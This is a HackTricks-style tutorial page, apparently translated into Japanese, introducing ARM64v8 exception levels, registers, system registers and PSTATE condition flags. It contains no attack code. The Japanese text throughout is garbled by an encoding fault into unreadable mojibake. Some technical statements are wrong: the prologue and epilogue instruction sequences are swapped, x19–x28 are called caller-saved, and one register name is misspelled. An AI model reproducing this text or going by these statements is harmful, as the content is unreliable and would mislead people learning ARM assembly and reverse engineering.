# ARM64v8ã¸ã®å°å…¥

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**è³¼èª­ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«** [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}

## **ä¾‹å¤–ãƒ¬ãƒ™ãƒ« - ELï¼ˆARM64v8ï¼‰**

ARMv8ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã§ã¯ã€å®Ÿè¡Œãƒ¬ãƒ™ãƒ«ã§ã‚ã‚‹ä¾‹å¤–ãƒ¬ãƒ™ãƒ«ï¼ˆELsï¼‰ãŒã€å®Ÿè¡Œç’°å¢ƒã®ç‰¹æ¨©ãƒ¬ãƒ™ãƒ«ã¨æ©Ÿèƒ½ã‚’å®šç¾©ã—ã¾ã™ã€‚EL0ã‹ã‚‰EL3ã¾ã§ã®4ã¤ã®ä¾‹å¤–ãƒ¬ãƒ™ãƒ«ãŒã‚ã‚Šã€ãã‚Œãã‚Œç•°ãªã‚‹ç›®çš„ã‚’æœãŸã—ã¦ã„ã¾ã™ï¼š

1. **EL0 - ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ¢ãƒ¼ãƒ‰**:
* ã“ã‚Œã¯æœ€ã‚‚ç‰¹æ¨©ã®ãªã„ãƒ¬ãƒ™ãƒ«ã§ã‚ã‚Šã€é€šå¸¸ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
* EL0ã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãŠäº’ã„ã‚„ã‚·ã‚¹ãƒ†ãƒ ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‹ã‚‰åˆ†é›¢ã•ã‚Œã¦ãŠã‚Šã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¨å®‰å®šæ€§ãŒå‘ä¸Šã—ã¦ã„ã¾ã™ã€‚
2. **EL1 - ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã‚«ãƒ¼ãƒãƒ«ãƒ¢ãƒ¼ãƒ‰**:
* ã»ã¨ã‚“ã©ã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã‚«ãƒ¼ãƒãƒ«ã¯ã“ã®ãƒ¬ãƒ™ãƒ«ã§å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚
* EL1ã¯EL0ã‚ˆã‚Šã‚‚ç‰¹æ¨©ãŒã‚ã‚Šã€ã‚·ã‚¹ãƒ†ãƒ ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ãŒã€ã‚·ã‚¹ãƒ†ãƒ ã®æ•´åˆæ€§ã‚’ç¢ºä¿ã™ã‚‹ãŸã‚ã«ã„ãã¤ã‹ã®åˆ¶é™ãŒã‚ã‚Šã¾ã™ã€‚
3. **EL2 - ãƒã‚¤ãƒ‘ãƒ¼ãƒã‚¤ã‚¶ãƒ¼ãƒ¢ãƒ¼ãƒ‰**:
* ã“ã®ãƒ¬ãƒ™ãƒ«ã¯ä»®æƒ³åŒ–ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚EL2ã§å®Ÿè¡Œã•ã‚Œã‚‹ãƒã‚¤ãƒ‘ãƒ¼ãƒã‚¤ã‚¶ãƒ¼ã¯ã€åŒã˜ç‰©ç†ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹è¤‡æ•°ã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ï¼ˆãã‚Œãã‚ŒãŒç‹¬è‡ªã®EL1ã§ï¼‰ã‚’ç®¡ç†ã§ãã¾ã™ã€‚
* EL2ã«ã¯ä»®æƒ³åŒ–ç’°å¢ƒã®åˆ†é›¢ã¨åˆ¶å¾¡ã®æ©Ÿèƒ½ãŒæä¾›ã•ã‚Œã¦ã„ã¾ã™ã€‚
4. **EL3 - ã‚»ã‚­ãƒ¥ã‚¢ãƒ¢ãƒ‹ã‚¿ãƒ¼ãƒ¢ãƒ¼ãƒ‰**:
* ã“ã‚Œã¯æœ€ã‚‚ç‰¹æ¨©ã®ã‚ã‚‹ãƒ¬ãƒ™ãƒ«ã§ã‚ã‚Šã€ã‚»ã‚­ãƒ¥ã‚¢ãƒ–ãƒ¼ãƒˆã‚„ä¿¡é ¼ã•ã‚ŒãŸå®Ÿè¡Œç’°å¢ƒã«ã‚ˆãä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
* EL3ã¯ã‚»ã‚­ãƒ¥ã‚¢çŠ¶æ…‹ã¨éã‚»ã‚­ãƒ¥ã‚¢çŠ¶æ…‹ã®é–“ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’ç®¡ç†ãŠã‚ˆã³åˆ¶å¾¡ã§ãã¾ã™ï¼ˆã‚»ã‚­ãƒ¥ã‚¢ãƒ–ãƒ¼ãƒˆã€ä¿¡é ¼ã•ã‚ŒãŸOSãªã©ï¼‰ã€‚

ã“ã‚Œã‚‰ã®ãƒ¬ãƒ™ãƒ«ã®ä½¿ç”¨ã«ã‚ˆã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‹ã‚‰æœ€ã‚‚ç‰¹æ¨©ã®ã‚ã‚‹ã‚·ã‚¹ãƒ†ãƒ ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã¾ã§ã€ã‚·ã‚¹ãƒ†ãƒ ã®ç•°ãªã‚‹å´é¢ã‚’æ§‹é€ åŒ–ã—ã¦å®‰å…¨ã«ç®¡ç†ã™ã‚‹æ–¹æ³•ãŒæä¾›ã•ã‚Œã¾ã™ã€‚ARMv8ã®ç‰¹æ¨©ãƒ¬ãƒ™ãƒ«ã¸ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€ç•°ãªã‚‹ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’åŠ¹æœçš„ã«åˆ†é›¢ã™ã‚‹ã“ã¨ã§ã€ã‚·ã‚¹ãƒ†ãƒ ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¨å …ç‰¢æ€§ã‚’å‘ä¸Šã•ã›ã¾ã™ã€‚

## **ãƒ¬ã‚¸ã‚¹ã‚¿ï¼ˆARM64v8ï¼‰**

ARM64ã«ã¯**31å€‹ã®æ±ç”¨ãƒ¬ã‚¸ã‚¹ã‚¿**ãŒã‚ã‚Šã€`x0`ã‹ã‚‰`x30`ã¾ã§ãƒ©ãƒ™ãƒ«ä»˜ã‘ã•ã‚Œã¦ã„ã¾ã™ã€‚ãã‚Œãã‚ŒãŒ**64ãƒ“ãƒƒãƒˆ**ï¼ˆ8ãƒã‚¤ãƒˆï¼‰ã®å€¤ã‚’æ ¼ç´ã§ãã¾ã™ã€‚32ãƒ“ãƒƒãƒˆã®å€¤ã®ã¿ã‚’å¿…è¦ã¨ã™ã‚‹æ“ä½œã®å ´åˆã€åŒã˜ãƒ¬ã‚¸ã‚¹ã‚¿ã«ã¯`w0`ã‹ã‚‰`w30`ã¨ã„ã†åå‰ã‚’ä½¿ç”¨ã—ã¦32ãƒ“ãƒƒãƒˆãƒ¢ãƒ¼ãƒ‰ã§ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

1. **`x0`** ã‹ã‚‰ **`x7`** - ã“ã‚Œã‚‰ã¯é€šå¸¸ã€ã‚¹ã‚¯ãƒ©ãƒƒãƒãƒ¬ã‚¸ã‚¹ã‚¿ã¨ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³ã«ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’æ¸¡ã™ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
* **`x0`** ã¯é–¢æ•°ã®æˆ»ã‚Šãƒ‡ãƒ¼ã‚¿ã‚‚ä¿æŒã—ã¾ã™ã€‚
2. **`x8`** - Linuxã‚«ãƒ¼ãƒãƒ«ã§ã¯ã€`x8`ã¯`svc`å‘½ä»¤ã®ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ç•ªå·ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚**macOSã§ã¯x16ãŒä½¿ç”¨ã•ã‚Œã¾ã™ï¼**
3. **`x9`** ã‹ã‚‰ **`x15`** - ã•ã‚‰ãªã‚‹ä¸€æ™‚ãƒ¬ã‚¸ã‚¹ã‚¿ã§ã‚ã‚Šã€ãƒ­ãƒ¼ã‚«ãƒ«å¤‰æ•°ã«ã‚ˆãä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
4. **`x16`** ã¨ **`x17`** - **æ‰‹ç¶šãå†…å‘¼ã³å‡ºã—ãƒ¬ã‚¸ã‚¹ã‚¿**ã€‚å³å€¤ã®ãŸã‚ã®ä¸€æ™‚ãƒ¬ã‚¸ã‚¹ã‚¿ã€‚é–“æ¥é–¢æ•°å‘¼ã³å‡ºã—ã‚„PLTï¼ˆæ‰‹ç¶šããƒªãƒ³ã‚¯ãƒ†ãƒ¼ãƒ–ãƒ«ï¼‰ã‚¹ã‚¿ãƒ–ã«ã‚‚ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
* **`x16`** ã¯**macOS**ã§**`svc`**å‘½ä»¤ã®**ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ç•ªå·**ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
5. **`x18`** - **ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ãƒ¬ã‚¸ã‚¹ã‚¿**ã€‚æ±ç”¨ãƒ¬ã‚¸ã‚¹ã‚¿ã¨ã—ã¦ä½¿ç”¨ã§ãã¾ã™ãŒã€ä¸€éƒ¨ã®ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã§ã¯ã€ã“ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã¯ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ å›ºæœ‰ã®ç”¨é€”ã«äºˆç´„ã•ã‚Œã¦ã„ã¾ã™ï¼šWindowsã§ã¯ç¾åœ¨ã®ã‚¹ãƒ¬ãƒƒãƒ‰ç’°å¢ƒãƒ–ãƒ­ãƒƒã‚¯ã¸ã®ãƒã‚¤ãƒ³ã‚¿ã€Linuxã‚«ãƒ¼ãƒãƒ«ã§ã¯ç¾åœ¨ã®**å®Ÿè¡Œä¸­ã®ã‚¿ã‚¹ã‚¯æ§‹é€ ä½“ã¸ã®ãƒã‚¤ãƒ³ã‚¿**ã€‚
6. **`x19`** ã‹ã‚‰ **`x28`** - ã“ã‚Œã‚‰ã¯å‘¼ã³å‡ºã—å…ƒä¿å­˜ãƒ¬ã‚¸ã‚¹ã‚¿ã§ã™ã€‚é–¢æ•°ã¯ã“ã‚Œã‚‰ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã®å€¤ã‚’å‘¼ã³å‡ºã—å…ƒã®ãŸã‚ã«ä¿å­˜ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ãã‚Œã‚‰ã¯ã‚¹ã‚¿ãƒƒã‚¯ã«ä¿å­˜ã•ã‚Œã€å‘¼ã³å‡ºã—å…ƒã«æˆ»ã‚‹å‰ã«å›å¾©ã•ã‚Œã¾ã™ã€‚
7. **`x29`** - ã‚¹ã‚¿ãƒƒã‚¯ãƒ•ãƒ¬ãƒ¼ãƒ ã‚’è¿½è·¡ã™ã‚‹ãŸã‚ã®**ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¤ãƒ³ã‚¿**ã€‚æ–°ã—ã„ã‚¹ã‚¿ãƒƒã‚¯ãƒ•ãƒ¬ãƒ¼ãƒ ãŒé–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ãŸã‚ã«ä½œæˆã•ã‚Œã‚‹ã¨ãã€**`x29`** ãƒ¬ã‚¸ã‚¹ã‚¿ã¯**ã‚¹ã‚¿ãƒƒã‚¯ã«ä¿å­˜**ã•ã‚Œã€æ–°ã—ã„ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¤ãƒ³ã‚¿ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆ**`sp`**ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼‰ãŒ**ã“ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã«ä¿å­˜**ã•ã‚Œã¾ã™ã€‚
* ã“ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã¯**ä¸€èˆ¬ç›®çš„ãƒ¬ã‚¸ã‚¹ã‚¿**ã¨ã—ã¦ã‚‚ä½¿ç”¨ã§ãã¾ã™ãŒã€é€šå¸¸ã¯**ãƒ­ãƒ¼ã‚«ãƒ«å¤‰æ•°**ã¸ã®**å‚ç…§**ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
8. **`x30`** ã¾ãŸã¯ **`lr`**- **ãƒªãƒ³ã‚¯ãƒ¬ã‚¸ã‚¹ã‚¿**ã€‚`BL`ï¼ˆãƒªãƒ³ã‚¯ä»˜ããƒ–ãƒ©ãƒ³ãƒï¼‰ã¾ãŸã¯`BLR`ï¼ˆãƒ¬ã‚¸ã‚¹ã‚¿ã¸ã®ãƒªãƒ³ã‚¯ä»˜ããƒ–ãƒ©ãƒ³ãƒï¼‰å‘½ä»¤ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ãã«**`pc`**ã®å€¤ã‚’ã“ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã«æ ¼ç´ã™ã‚‹ã“ã¨ã§**æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’ä¿æŒã—ã¾ã™ã€‚
* ä»–ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã¨åŒæ§˜ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
* ç¾åœ¨ã®é–¢æ•°ãŒæ–°ã—ã„é–¢æ•°ã‚’å‘¼ã³å‡ºã™äºˆå®šã§ã‚ã‚Šã€ã—ãŸãŒã£ã¦`lr`ã‚’ä¸Šæ›¸ãã™ã‚‹å ´åˆã€æœ€åˆã«ã‚¹ã‚¿ãƒƒã‚¯ã«ä¿å­˜ã—ã€ã“ã‚ŒãŒã‚¨ãƒ”ãƒ­ãƒ¼ã‚°ï¼ˆ`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp`ã¨`lr`ã‚’ä¿å­˜ã—ã€ã‚¹ãƒšãƒ¼ã‚¹ã‚’ç”Ÿæˆã—ã€æ–°ã—ã„`fp`ã‚’å–å¾—ï¼‰ã§ã€æœ€å¾Œã«å›å¾©ã—ã¾ã™ã€‚ã“ã‚ŒãŒãƒ—ãƒ­ãƒ­ãƒ¼ã‚°ï¼ˆ`ldp x29, x30, [sp], #48; ret` -> `fp`ã¨`lr`ã‚’å›å¾©ã—ã¦æˆ»ã‚‹ï¼‰ã§ã™ã€‚
9. **`sp`** - **ã‚¹ã‚¿ãƒƒã‚¯ãƒã‚¤ãƒ³ã‚¿**ã€‚ã‚¹ã‚¿ãƒƒã‚¯ã®å…ˆé ­ã‚’è¿½è·¡ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
* **`sp`**ã®å€¤ã¯å¸¸ã«å°‘ãªãã¨ã‚‚**ã‚¯ãƒ¯ãƒƒãƒ‰ãƒ¯ãƒ¼ãƒ‰ã®ã‚¢ãƒ©ã‚¤ãƒ¡ãƒ³ãƒˆ**ã‚’ä¿æŒã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ãã‚Œä»¥å¤–ã®å ´åˆã¯ã‚¢ãƒ©ã‚¤ãƒ¡ãƒ³ãƒˆä¾‹å¤–ãŒç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
10. **`pc`** - æ¬¡ã®å‘½ä»¤ã‚’æŒ‡ã™**ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚«ã‚¦ãƒ³ã‚¿**ã€‚ã“ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã¯ä¾‹å¤–ç”Ÿæˆã€ä¾‹å¤–ãƒªã‚¿ãƒ¼ãƒ³ã€ãŠã‚ˆã³ãƒ–ãƒ©ãƒ³ãƒã‚’ä»‹ã—ã¦ã®ã¿æ›´æ–°ã§ãã¾ã™ã€‚ã“ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã‚‹é€šå¸¸ã®å‘½ä»¤ã¯ã€**`pc`**ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’**`lr`**ï¼ˆãƒªãƒ³ã‚¯ãƒ¬ã‚¸ã‚¹ã‚¿ï¼‰ã«æ ¼ç´ã™ã‚‹ãŸã‚ã®ãƒ–ãƒ©ãƒ³ãƒãƒªãƒ³ã‚¯å‘½ä»¤ï¼ˆBLã€BLRï¼‰ã ã‘ã§ã™ã€‚
11. **`xzr`** - **ã‚¼ãƒ­ãƒ¬ã‚¸ã‚¹ã‚¿**ã€‚32ãƒ“ãƒƒãƒˆãƒ¬ã‚¸ã‚¹ã‚¿å½¢å¼ã§ã¯**`wzr`**ã¨ã‚‚å‘¼ã°ã‚Œã¾ã™ã€‚ã‚¼ãƒ­å€¤ã‚’ç°¡å˜ã«å–å¾—ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ï¼ˆä¸€èˆ¬çš„ãªæ“ä½œï¼‰ã¾ãŸã¯**`subs`**ã‚’ä½¿ç”¨ã—ã¦æ¯”è¼ƒã‚’è¡Œã†ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚**`subs XZR, Xn, #10`**ã®ã‚ˆã†ã«çµæœãƒ‡ãƒ¼ã‚¿ã‚’ã©ã“ã«ã‚‚ä¿å­˜ã—ãªã„ã§ï¼ˆ**`xzr`**ã«ï¼‰ãƒ‡ãƒ¼ã‚¿ã‚’ä¿å­˜ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**`Wn`** ãƒ¬ã‚¸ã‚¹ã‚¿ã¯**`Xn`** ãƒ¬ã‚¸ã‚¹ã‚¿ã®32ãƒ“ãƒƒãƒˆãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã™ã€‚

### SIMDãŠã‚ˆã³æµ®å‹•å°æ•°ç‚¹ãƒ¬ã‚¸ã‚¹ã‚¿

ã•ã‚‰ã«ã€æœ€é©åŒ–ã•ã‚ŒãŸå˜ä¸€å‘½ä»¤è¤‡æ•°ãƒ‡ãƒ¼ã‚¿ï¼ˆSIMDï¼‰æ“ä½œã‚„æµ®å‹•å°æ•°ç‚¹æ¼”ç®—ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã€é•·ã•ãŒ128ãƒ“ãƒƒãƒˆã®åˆ¥ã®**32å€‹ã®ãƒ¬ã‚¸ã‚¹ã‚¿**ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã¯Vnãƒ¬ã‚¸ã‚¹ã‚¿ã¨å‘¼ã°ã‚Œã¾ã™ãŒã€64ãƒ“ãƒƒãƒˆã€32ãƒ“ãƒƒãƒˆã€16ãƒ“ãƒƒãƒˆã€8ãƒ“ãƒƒãƒˆã§å‹•ä½œã™ã‚‹ã“ã¨ã‚‚ã§ãã€ãã®å ´åˆã¯**`Qn`**ã€**`Dn`**ã€**`Sn`**ã€**`Hn`**ã€**`Bn`**ã¨å‘¼ã°ã‚Œã¾ã™ã€‚
### ã‚·ã‚¹ãƒ†ãƒ ãƒ¬ã‚¸ã‚¹ã‚¿

**æ•°ç™¾ã®ã‚·ã‚¹ãƒ†ãƒ ãƒ¬ã‚¸ã‚¹ã‚¿**ã€ã¾ãŸã¯ç‰¹æ®Šç”¨é€”ãƒ¬ã‚¸ã‚¹ã‚¿ï¼ˆSPRï¼‰ã¯ã€**ãƒ—ãƒ­ã‚»ãƒƒã‚µ**ã®å‹•ä½œã‚’**ç›£è¦–**ãŠã‚ˆã³**åˆ¶å¾¡**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚\
ã“ã‚Œã‚‰ã¯ã€å°‚ç”¨ã®ç‰¹æ®Šå‘½ä»¤ **`mrs`** ã¨ **`msr`** ã‚’ä½¿ç”¨ã—ã¦ã®ã¿èª­ã¿å–ã‚Šã¾ãŸã¯è¨­å®šã§ãã¾ã™ã€‚

ç‰¹æ®Šãƒ¬ã‚¸ã‚¹ã‚¿ **`TPIDR_EL0`** ã¨ **`TPIDDR_EL0`** ã¯ã€ãƒªãƒãƒ¼ã‚¹ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãƒªãƒ³ã‚°æ™‚ã«ä¸€èˆ¬çš„ã«è¦‹ã‚‰ã‚Œã¾ã™ã€‚`EL0` æ¥å°¾è¾ã¯ã€ãƒ¬ã‚¸ã‚¹ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹**æœ€å°ä¾‹å¤–**ã‚’ç¤ºã—ã¾ã™ï¼ˆã“ã®å ´åˆã€EL0ã¯é€šå¸¸ã®ä¾‹å¤–ï¼ˆç‰¹æ¨©ï¼‰ãƒ¬ãƒ™ãƒ«ã§é€šå¸¸ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ï¼‰ã€‚\
ã“ã‚Œã‚‰ã¯é€šå¸¸ã€ãƒ¡ãƒ¢ãƒªã®**ã‚¹ãƒ¬ãƒƒãƒ‰ãƒ­ãƒ¼ã‚«ãƒ«ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸**é ˜åŸŸã®**ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’æ ¼ç´ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚é€šå¸¸ã€æœ€åˆã®ã‚‚ã®ã¯EL0ã§å®Ÿè¡Œã•ã‚Œã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã«å¯¾ã—ã¦èª­ã¿æ›¸ãå¯èƒ½ã§ã™ãŒã€2ç•ªç›®ã¯EL0ã‹ã‚‰èª­ã¿å–ã‚Šã€EL1ã‹ã‚‰æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ï¼ˆã‚«ãƒ¼ãƒãƒ«ã®ã‚ˆã†ãªï¼‰ã€‚

* `mrs x0, TPIDR_EL0 ; TPIDR_EL0 ã‚’ x0 ã«èª­ã¿è¾¼ã‚€`
* `msr TPIDR_EL0, X0 ; x0 ã‚’ TPIDR_EL0 ã«æ›¸ãè¾¼ã‚€`

### **PSTATE**

**PSTATE** ã«ã¯ã€ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã§ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚ŒãŸã„ãã¤ã‹ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒå«ã¾ã‚Œã¦ãŠã‚Šã€**`SPSR_ELx`** ç‰¹æ®Šãƒ¬ã‚¸ã‚¹ã‚¿ã«æ ¼ç´ã•ã‚Œã¾ã™ã€‚ã“ã“ã§ã€X ã¯ãƒˆãƒªã‚¬ãƒ¼ã•ã‚ŒãŸä¾‹å¤–ã®**æ¨©é™** **ãƒ¬ãƒ™ãƒ«**ã‚’ç¤ºã—ã¾ã™ï¼ˆã“ã‚Œã«ã‚ˆã‚Šã€ä¾‹å¤–ãŒçµ‚äº†ã—ãŸã¨ãã«ãƒ—ãƒ­ã‚»ã‚¹ã®çŠ¶æ…‹ã‚’å›å¾©ã§ãã¾ã™ï¼‰ã€‚\
ã“ã‚Œã‚‰ã¯ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã§ã™ï¼š

<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

* **`N`**ã€**`Z`**ã€**`C`**ã€**`V`** æ¡ä»¶ãƒ•ãƒ©ã‚°ï¼š
* **`N`** ã¯æ“ä½œãŒè² ã®çµæœã‚’ç”Ÿã˜ãŸã“ã¨ã‚’æ„å‘³ã—ã¾ã™
* **`Z`** ã¯æ“ä½œãŒã‚¼ãƒ­ã‚’ç”Ÿã˜ãŸã“ã¨ã‚’æ„å‘³ã—ã¾ã™
* **`C`** ã¯æ“ä½œãŒã‚­ãƒ£ãƒªãƒ¼ã—ãŸã“ã¨ã‚’æ„å‘³ã—ã¾ã™
* **`V`** ã¯æ“ä½œãŒç¬¦å·ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’ç”Ÿã˜ãŸã“ã¨ã‚’æ„å‘³ã—ã¾ã™ï¼š
* 2ã¤ã®æ­£ã®æ•°ã®åˆè¨ˆã¯è² ã®çµæœã‚’ç”Ÿã˜ã¾ã™ã€‚
* 2ã¤ã®è² ã®æ•°ã®åˆè¨ˆã¯æ­£ã®çµæœã‚’ç”Ÿã˜ã¾ã™ã€‚
* æ¸›ç®—ã§ã¯ã€å¤§ããªè² ã®æ•°ãŒå°ã•ãªæ­£ã®æ•°ã‹ã‚‰å¼•ã‹ã‚Œã‚‹å ´åˆï¼ˆã¾ãŸã¯ãã®é€†ï¼‰ã€çµæœãŒä¸ãˆã‚‰ã‚ŒãŸãƒ“ãƒƒãƒˆã‚µã‚¤ã‚ºã®ç¯„å›²å†…ã«è¡¨ç¾ã§ããªã„å ´åˆã€‚
* æ˜ã‚‰ã‹ã«ã€ãƒ—ãƒ­ã‚»ãƒƒã‚µã¯æ“ä½œãŒç¬¦å·ä»˜ãã‹ã©ã†ã‹ã‚’çŸ¥ã‚‰ãªã„ãŸã‚ã€æ“ä½œã‚’ç¬¦å·ä»˜ãã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€ç¬¦å·ä»˜ãã¾ãŸã¯ç¬¦å·ãªã—ã®å ´åˆã«ç™ºç”Ÿã—ãŸã‚­ãƒ£ãƒªãƒ¼ã‚’ç¤ºã—ã¾ã™ã€‚

{% hint style="warning" %}
ã™ã¹ã¦ã®å‘½ä»¤ãŒã“ã‚Œã‚‰ã®ãƒ•ãƒ©ã‚°ã‚’æ›´æ–°ã™ã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚**`CMP`** ã‚„ **`TST`** ã®ã‚ˆã†ãªä¸€éƒ¨ã®å‘½ä»¤ã¯ã€ãŠã‚ˆã³ **`ADDS`** ã®ã‚ˆã†ãª s æ¥å°¾è¾ã‚’æŒã¤ä»–ã®å‘½ä»¤ã‚‚ãã‚Œã‚’è¡Œã„ã¾ã™ã€‚
{% endhint %}

